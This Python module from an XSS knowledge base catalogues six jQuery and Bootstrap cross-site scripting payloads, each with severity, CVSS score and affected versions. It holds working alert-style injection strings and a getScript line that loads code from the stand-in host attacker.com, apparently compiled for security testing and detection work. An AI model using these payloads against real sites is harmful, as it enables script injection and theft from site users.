#!/usr/bin/env python3
"""
Project: BRS-KB (BRS XSS Knowledge Base)
Company: EasyProTech LLC (www.easypro.tech)
Dev: Brabus
Date: 2026-01-10 UTC
Status: Created
Telegram: https://t.me/EasyProTech

jQuery Gadget XSS Payloads
"""

from ..models import PayloadEntry

JQUERY_GADGETS_PAYLOADS = {
    "jquery_selector_autoexec": PayloadEntry(
        payload="<div data-role='popup' data-html='<script>alert(1)</script>'></div>",
        contexts=["html_content", "jquery"],
        severity="high",
        cvss_score=7.5,
        description="jQuery Mobile data-role gadget auto-execution",
        tags=["jquery", "gadget", "mobile", "auto-exec"],
        reliability="medium",
        known_affected=["jquery-mobile"],
    ),
    "jquery_location_hash_xss": PayloadEntry(
        payload="<img src=x onerror=window.location.hash='<img src=x onerror=alert(1)>';$(window.location.hash)>",
        contexts=["javascript", "jquery"],
        severity="high",
        cvss_score=7.5,
        description="jQuery $() selector sink via location.hash",
        tags=["jquery", "sink", "selector", "hash"],
        reliability="high",
        known_affected=["jquery < 3.5.0"],
    ),
    "jquery_html_prefilter": PayloadEntry(
        payload="<style><style /><img src=x onerror=alert(1)>",
        contexts=["html_content", "jquery"],
        severity="medium",
        cvss_score=6.1,
        description="jQuery HTML prefilter bypass via regex",
        tags=["jquery", "regex-bypass", "prefilter"],
        reliability="medium",
        known_affected=["jquery < 3.5.0"],
    ),
    "jquery_parsehtml_xss": PayloadEntry(
        payload="<iframe src='javascript:alert(1)'></iframe>",
        contexts=["javascript", "jquery"],
        severity="high",
        cvss_score=7.5,
        description="jQuery.parseHTML execution including scripts/iframes",
        tags=["jquery", "parseHTML", "sink"],
        reliability="medium",
        known_affected=["jquery all"],
    ),
    "jquery_getscript_remote": PayloadEntry(
        payload="$.getScript('https://attacker.com/xss.js')",
        contexts=["javascript", "jquery"],
        severity="high",
        cvss_score=8.1,
        description="jQuery getScript RCE/XSS",
        tags=["jquery", "getScript", "remote-load"],
        reliability="high",
        known_affected=["jquery all"],
    ),
    "jquery_bootlint_gadget": PayloadEntry(
        payload="<div id='myModal' class='modal fade' tabindex='-1' role='dialog'><div class='modal-dialog'><div class='modal-content'><div class='modal-header'><button type='button' class='close' data-dismiss='modal'>&times;</button><h4 class='modal-title' id='myModalLabel'>Modal title</h4></div><div class='modal-body'><img src=x onerror=alert(1)></div></div></div></div>",
        contexts=["html_content", "jquery"],
        severity="medium",
        cvss_score=6.1,
        description="Bootstrap/jQuery modal gadget",
        tags=["jquery", "bootstrap", "gadget"],
        reliability="low",
    ),
}

JQUERY_GADGETS_TOTAL = len(JQUERY_GADGETS_PAYLOADS)
